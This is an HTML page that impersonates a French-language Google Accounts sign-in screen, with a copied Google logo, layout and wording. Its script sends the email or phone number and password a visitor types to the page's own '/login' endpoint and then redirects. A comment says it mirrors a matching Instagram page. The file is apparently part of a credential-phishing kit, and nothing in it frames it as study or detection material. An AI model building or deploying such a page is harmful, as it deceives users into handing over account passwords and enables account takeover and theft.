<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Connexion - Comptes Google</title>
    <style>
        * {
            box-sizing: border-box;
        }

        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #202124;
            font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
            color: #e8eaed;
            overflow-x: hidden;
        }

        .container {
            display: flex;
            min-height: 100vh;
        }

        .left-panel {
            flex: 1;
            padding: 48px 64px;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
        }

        .right-panel {
            flex: 1;
            padding: 48px 64px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            max-width: 450px;
        }

        .google-logo {
            width: 75px;
            height: 24px;
            margin-bottom: 48px;
        }

        .google-g { color: #4285f4; font-size: 28px; font-weight: 400; }
        .google-o1 { color: #ea4335; font-size: 28px; font-weight: 400; }
        .google-o2 { color: #fbbc05; font-size: 28px; font-weight: 400; }
        .google-g2 { color: #34a853; font-size: 28px; font-weight: 400; }
        .google-l { color: #ea4335; font-size: 28px; font-weight: 400; }
        .google-e { color: #4285f4; font-size: 28px; font-weight: 400; }

        .title {
            font-size: 36px;
            font-weight: 400;
            color: #e8eaed;
            margin: 0 0 12px 0;
            line-height: 1.3;
        }

        .subtitle {
            font-size: 18px;
            color: #9aa0a6;
            font-weight: 400;
            margin: 0 0 48px 0;
        }

        .form-container {
            width: 100%;
        }

        .input-group {
            margin-bottom: 24px;
            position: relative;
        }

        .input-field {
            width: 100%;
            padding: 16px;
            background-color: transparent;
            border: 1px solid #5f6368;
            border-radius: 4px;
            color: #e8eaed;
            font-size: 16px;
            font-family: inherit;
            transition: all 0.2s ease;
        }

        .input-field:focus {
            outline: none;
            border-color: #8ab4f8;
            background-color: rgba(138, 180, 248, 0.04);
        }

        .input-field::placeholder {
            color: #9aa0a6;
        }

        .forgot-link {
            color: #8ab4f8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 32px;
            display: inline-block;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .guest-mode {
            color: #9aa0a6;
            font-size: 14px;
            line-height: 1.4;
            margin-bottom: 48px;
        }

        .guest-mode a {
            color: #8ab4f8;
            text-decoration: none;
        }

        .guest-mode a:hover {
            text-decoration: underline;
        }

        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }

        .create-account {
            color: #8ab4f8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            padding: 10px 24px;
        }

        .create-account:hover {
            background-color: rgba(138, 180, 248, 0.08);
            border-radius: 4px;
        }

        .login-btn {
            background-color: #8ab4f8;
            color: #202124;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            padding: 10px 24px;
            min-width: 80px;
            transition: all 0.2s ease;
        }

        .login-btn:hover {
            background-color: #aecbfa;
            box-shadow: 0 1px 3px 0 rgba(0,0,0,.3);
        }

        .login-btn:disabled {
            background-color: #3c4043;
            color: #9aa0a6;
            cursor: not-allowed;
            box-shadow: none;
        }

        .loading {
            display: none;
            color: #8ab4f8;
            font-size: 14px;
            text-align: center;
            margin-top: 16px;
        }

        .error {
            color: #f28b82;
            font-size: 14px;
            margin-top: 16px;
            padding: 8px 0;
            display: none;
        }

        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 24px;
            background-color: #202124;
            border-top: 1px solid #3c4043;
        }

        .footer-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1200px;
            margin: 0 auto;
        }

        .language-selector {
            background: none;
            border: 1px solid #5f6368;
            color: #e8eaed;
            font-size: 14px;
            cursor: pointer;
            padding: 8px 12px;
            border-radius: 4px;
        }

        .language-selector:hover {
            border-color: #8ab4f8;
        }

        .footer-links {
            display: flex;
            gap: 32px;
        }

        .footer-link {
            color: #9aa0a6;
            text-decoration: none;
            font-size: 12px;
        }

        .footer-link:hover {
            color: #e8eaed;
        }

        @media (max-width: 768px) {
            .container {
                flex-direction: column;
                min-height: 100vh;
            }

            .left-panel {
                flex: none;
                padding: 48px 24px 0;
                text-align: left;
                min-height: auto;
            }

            .right-panel {
                flex: 1;
                padding: 32px 24px;
                max-width: none;
                display: flex;
                flex-direction: column;
                justify-content: space-between;
            }

            .google-logo {
                margin-bottom: 32px;
            }

            .title {
                font-size: 32px;
                margin-bottom: 8px;
            }

            .subtitle {
                font-size: 16px;
                margin-bottom: 48px;
            }

            .input-field {
                padding: 16px;
                font-size: 16px;
                border-radius: 8px;
            }

            .forgot-link {
                margin-bottom: 24px;
            }

            .guest-mode {
                margin-bottom: 64px;
                font-size: 14px;
            }

            .button-container {
                flex-direction: row;
                justify-content: space-between;
                align-items: center;
                gap: 16px;
            }

            .login-btn {
                padding: 12px 32px;
                border-radius: 24px;
                min-width: 100px;
            }

            .create-account {
                padding: 12px 0;
            }

            .footer {
                position: relative;
                margin-top: auto;
                padding: 24px;
                border-top: none;
            }

            .footer-content {
                flex-direction: column;
                gap: 20px;
                text-align: left;
            }

            .language-selector {
                align-self: flex-start;
                background: transparent;
                border: none;
                color: #9aa0a6;
                font-size: 14px;
                padding: 8px 0;
            }

            .footer-links {
                justify-content: flex-start;
                gap: 32px;
                flex-wrap: wrap;
            }

            .footer-link {
                font-size: 14px;
            }
        }

        @media (max-width: 480px) {
            .left-panel {
                padding: 32px 16px 0;
            }

            .right-panel {
                padding: 24px 16px;
            }

            .title {
                font-size: 28px;
            }

            .subtitle {
                font-size: 16px;
            }

            .input-field {
                padding: 16px;
                font-size: 16px;
            }

            .guest-mode {
                font-size: 14px;
                margin-bottom: 48px;
            }

            .footer-links {
                gap: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-panel">
            <div class="google-logo">
                <span class="google-g">G</span><span class="google-o1">o</span><span class="google-o2">o</span><span class="google-g2">g</span><span class="google-l">l</span><span class="google-e">e</span>
            </div>
            
            <h1 class="title">Connexion</h1>
            <p class="subtitle">Utilisez votre compte Google</p>
        </div>

        <div class="right-panel">
            <div class="form-container">
                <form id="loginForm">
                    <div class="input-group">
                        <input type="email" id="username" name="username" class="input-field" placeholder="Adresse e-mail ou téléphone" required />
                    </div>
                    
                    <a href="#" class="forgot-link">Adresse e-mail oubliée ?</a>
                    
                    <div class="input-group">
                        <input type="password" id="password" name="password" class="input-field" placeholder="Mot de passe" required />
                    </div>
                    
                    <div class="guest-mode">
                        Ce n'est pas votre ordinateur ? Utilisez le mode Invité pour vous connecter en mode privé. <a href="#">En savoir plus sur l'utilisation du mode Invité</a>
                    </div>
                    
                    <div class="loading" id="loading">Connexion en cours...</div>
                    <div class="error" id="error"></div>
                    
                    <div class="button-container">
                        <a href="#" class="create-account">Créer un compte</a>
                        <button type="submit" class="login-btn" id="loginBtn">Suivant</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-content">
            <select class="language-selector">
                <option>Français (France)</option>
                <option>English</option>
                <option>Español</option>
                <option>Deutsch</option>
            </select>
            
            <div class="footer-links">
                <a href="#" class="footer-link">Aide</a>
                <a href="#" class="footer-link">Confidentialité</a>
                <a href="#" class="footer-link">Conditions</a>
            </div>
        </div>
    </div>

    <script>
        // Gestion du formulaire de connexion (même logique que la page Instagram)
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            const loading = document.getElementById('loading');
            const error = document.getElementById('error');
            
            error.style.display = 'none';
            error.textContent = '';
            
            if (!username || !password) {
                error.textContent = 'Veuillez remplir tous les champs';
                error.style.display = 'block';
                return;
            }
            
            // Validation email basique
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(username) && !/^\d+$/.test(username)) {
                error.textContent = 'Veuillez saisir une adresse e-mail ou un numéro de téléphone valide';
                error.style.display = 'block';
                return;
            }
            
            loginBtn.disabled = true;
            loginBtn.textContent = 'Connexion...';
            loading.style.display = 'block';
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ username, password })
                });
                
                const data = await response.json();
                
                if (data.status === 'success') {
                    if (data.redirect) {
                        window.location.href = data.redirect;
                    } else {
                        alert('Connexion réussie !');
                    }
                } else {
                    throw new Error(data.message || 'Erreur de connexion');
                }
                
            } catch (err) {
                console.error('Erreur:', err);
                error.textContent = 'Nom d\'utilisateur ou mot de passe incorrect. Réessayez ou cliquez sur "Adresse e-mail oubliée ?" pour récupérer votre compte.';
                error.style.display = 'block';
                
                loginBtn.disabled = false;
                loginBtn.textContent = 'Suivant';
                loading.style.display = 'none';
            }
        });

        // Effets sur les champs de saisie (même logique que Instagram)
        document.querySelectorAll('.input-field').forEach(input => {
            input.addEventListener('focus', function() {
                this.style.transform = 'scale(1.01)';
                this.style.transition = 'transform 0.2s ease';
            });

            input.addEventListener('blur', function() {
                this.style.transform = 'scale(1)';
            });

            input.addEventListener('input', function() {
                const error = document.getElementById('error');
                error.style.display = 'none';
                error.textContent = '';
            });
        });

        // Animation du logo Google au chargement
        window.addEventListener('load', function() {
            const logoLetters = document.querySelectorAll('.google-logo span');
            logoLetters.forEach((letter, index) => {
                setTimeout(() => {
                    letter.style.transform = 'scale(1.2)';
                    letter.style.transition = 'transform 0.3s ease';
                    setTimeout(() => {
                        letter.style.transform = 'scale(1)';
                    }, 200);
                }, index * 100);
            });
        });
    </script>
</body>
</html>
